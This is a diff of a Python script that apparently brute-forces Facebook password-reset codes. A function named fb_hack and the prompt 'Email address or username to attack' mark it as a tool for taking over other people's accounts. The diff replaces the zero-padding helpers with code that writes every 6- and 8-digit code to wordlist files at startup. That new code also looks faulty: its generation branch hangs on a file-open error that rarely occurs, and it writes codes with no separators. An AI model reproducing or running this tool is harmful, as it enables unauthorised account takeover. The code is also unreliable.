@@ -25,80 +25,21 @@ def setup_browser(self):
     browser.set_handle_refresh(False)
     return browser
 
-def passcode6(pass0):
-  pass1 = int(pass0)
-  pass2 = int(pass0)
-  if pass1 < 10**5 and pass1 > 9999:
-    pass2 = str(pass1)
-    h = ""
-    code = ("0", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**4 and pass1 > 999:
-    h = ""
-    code = ("00", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**3 and pass1 > 99:
-    h = ""
-    code = ("000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**2 and pass1 > 9:
-    h = ""
-    code = ("0000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10 and pass1 >= 0:
-    h = ""
-    code = ("00000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 0 :
-    pass1 = 999999
-    yo = str(pass1)
-  else:
-    yo = str(pass1)
-  return yo
-
-def passcode8(pass0):
-  pass1 = int(pass0)
-  pass2 = int(pass0)
-  """8"""
-  if pass1 < 10**7 and pass1 > 999999:
-    pass2 = str(pass1)
-    h = ""
-    code = ("0", str(pass2))
-    yo = h.join(code)
-    """7"""
-  elif pass1 < 10**6 and pass1 > 99999:
-    pass2 = str(pass1)
-    h = ""
-    code = ("00", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**5 and pass1 > 9999:
-    pass2 = str(pass1)
-    h = ""
-    code = ("000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**4 and pass1 > 999:
-    pass2 = str(pass1)
-    h = ""
-    code = ("0000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**3 and pass1 > 99:
-    pass2 = str(pass1)
-    h = ""
-    code = ("00000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10**2 and pass1 > 9:
-    pass2 = str(pass1)
-    h = ""
-    code = ("000000", str(pass2))
-    yo = h.join(code)
-  elif pass1 < 10 and pass1 >= 0:
-    pass2 = str(pass1)
-    h = ""
-    code = ("0000000", str(pass2))
-    yo = h.join(code)
-  else:
-    yo = str(pass1)
-  return yo
+def passcode6():
+  try:
+    f = open("6digits.txt", "a")
+    f.close()
+  except:
+    f = open("6digits.txt", "a+")
+    for combination in itertools.product(range(10), repeat=6):
+        f.write(''.join(map(str, combination)))
+  try:
+    z = open("8digits.txt", "a")
+    z.close()
+  except:
+    z = open("8digits.txt", "a+")
+    for combination in itertools.product(range(10), repeat=8):
+      z.write(''.join(map(str, combination)))
 
 def sleepy(counter):
   x = counter
@@ -254,6 +195,7 @@ def fb_hack(email, codex):
   return reset in reset1, y in passcoder, browser
 
 os.system('clear')
+passcode6()
 f = open("emails.txt", "r")
 ehack = input('Email address or username to attack:') or f.readlines(-1)
 f.close()
